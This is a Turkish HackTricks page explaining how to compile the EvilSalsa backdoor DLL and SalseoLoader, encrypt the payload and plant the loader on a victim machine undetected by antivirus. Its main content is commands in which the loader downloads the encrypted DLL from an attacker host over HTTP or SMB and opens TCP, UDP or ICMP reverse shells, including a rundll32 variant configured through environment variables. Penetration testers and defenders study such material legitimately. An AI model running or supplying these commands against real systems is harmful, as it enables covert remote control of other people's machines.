# Salseo

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **💬** [**Discord grubumuza**](https://discord.gg/hRep4RUj7f) **katılın veya** [**telegram grubuna**](https://t.me/peass) **katılın veya bizi Twitter 🐦** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Derlemeleri Derleme

Kaynak kodunu github'dan indirin ve **EvilSalsa** ve **SalseoLoader**'ı derleyin. Kodu derlemek için **Visual Studio**'nun yüklü olması gerekmektedir.

Bu projeleri, kullanacak olduğunuz Windows işletim sisteminin mimarisi için derleyin (Windows x64 destekliyorsa, o mimari için derleyin).

Mimariyi Visual Studio içinde **sol "Build" sekmesindeki** **"Platform Target"** bölümünden **seçebilirsiniz.**

(\*\*Bu seçenekleri bulamazsanız, **"Project Tab"** üzerine tıklayın ve ardından **"\<Project Name> Properties"** seçeneğine tıklayın)

![](<../.gitbook/assets/image (132).png>)

Sonra, her iki projeyi derleyin (Build -> Build Solution) (Log içinde yürütülebilir dosyanın yolunu göreceksiniz):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Arka Kapıyı Hazırlama

İlk olarak, **EvilSalsa.dll**'yi şifrelemeniz gerekecek. Bunun için, **encrypterassembly.py** adlı python betiğini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:

### **Python**

```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```

### Windows

### Windows

```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```

Şimdi Salseo işlemini gerçekleştirmek için ihtiyacınız olan her şeye sahipsiniz: **şifrelenmiş EvilDalsa.dll** ve **SalseoLoader'ın ikili dosyası.**

**SalseoLoader.exe ikili dosyasını makineye yükleyin. Herhangi bir AV tarafından tespit edilmemeleri gerekiyor...**

## **Arka kapıyı çalıştırın**

### **TCP ters kabuk almak (şifrelenmiş dll'yi HTTP aracılığıyla indirme)**

Ters kabuk dinleyici olarak nc başlatmayı ve şifrelenmiş evilsalsa'yı sunmak için bir HTTP sunucusu başlatmayı unutmayın.

```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```

### **Bir UDP ters kabuk almak (SMB üzerinden kodlanmış dll indirme)**

Ters kabuk dinleyici olarak nc'yi başlatmayı ve kodlanmış evilsalsa'yı sunmak için bir SMB sunucusu başlatmayı unutmayın (impacket-smbserver).

```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```

### **ICMP ters kabuk almak (kodlanmış dll zaten kurbanın içinde)**

**Bu sefer ters kabuk almak için istemci tarafında özel bir araca ihtiyacınız var. İndirin:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP Yanıtlarını Devre Dışı Bırakın:**

```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```

#### Müşteriyi çalıştırın:

```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```

#### Kurbanın içinde, salseo şeyini çalıştıralım:

```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```

## Ana işlevi dışa aktaran DLL olarak SalseoLoader'ı derleme

Visual Studio kullanarak SalseoLoader projesini açın.

### Ana işlevden önce ekle: \[DllExport]

![](https://github.com/carlospolop/hacktricks/blob/tr/.gitbook/assets/image%20\(2\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\)%20\(1\).png)

### Bu projeye DllExport yükleyin

#### **Araçlar** --> **NuGet Paket Yöneticisi** --> **Çözüm için NuGet Paketlerini Yönet...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **DllExport paketini arayın (Gözat sekmesini kullanarak) ve Yükle'yi seçin (ve açılan pencereyi kabul edin)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Projelerinizin klasöründe **DllExport.bat** ve **DllExport\_Configure.bat** dosyaları görünmelidir.

### DllExport'u kaldırın

**Kaldır**'ı seçin (evet, tuhaf ama bana güvenin, gerekli)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### Visual Studio'yu kapatın ve DllExport\_Configure'ı çalıştırın

Sadece Visual Studio'yu **kapatın**

Ardından, **SalseoLoader klasörüne** gidin ve **DllExport\_Configure.bat**'ı çalıştırın

**x64**'ü seçin (eğer bir x64 kutusunda kullanacaksanız, benim durumumda olduğu gibi), **System.Runtime.InteropServices**'ı (DllExport için **Namespace**) seçin ve **Uygula**'yı seçin

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### Projeyi tekrar Visual Studio ile açın

**\[DllExport]** artık hata olarak işaretlenmemelidir

![](<../.gitbook/assets/image (8) (1).png>)

### Çözümü derleyin

**Çıkış Türü = Sınıf Kitaplığı** seçin (Proje --> SalseoLoader Özellikleri --> Uygulama --> Çıkış türü = Sınıf Kitaplığı)

![](<../.gitbook/assets/image (10) (1).png>)

**x64 platformunu** seçin (Proje --> SalseoLoader Özellikleri --> Derleme --> Platform hedefi = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Çözümü derlemek için: Derle --> Çözümü Derle (Çıktı konsolunda yeni DLL'nin yolunu göreceksiniz)

### Oluşturulan Dll'yi test edin

Dll'yi test etmek istediğiniz yere kopyalayın.

Çalıştır:

```
rundll32.exe SalseoLoader.dll,main
```

Eğer hata görünmüyorsa, muhtemelen işlevsel bir DLL'niz var!!

## DLL kullanarak bir kabuk alın

Bir **HTTP** **sunucusu** kullanmayı ve bir **nc** **dinleyici** ayarlamayı unutmayın

### Powershell

```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```

### CMD

### CMD

```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** \[**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)\*\* takip edin.\*\*
* **Hacking püf noktalarınızı paylaşın, PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>
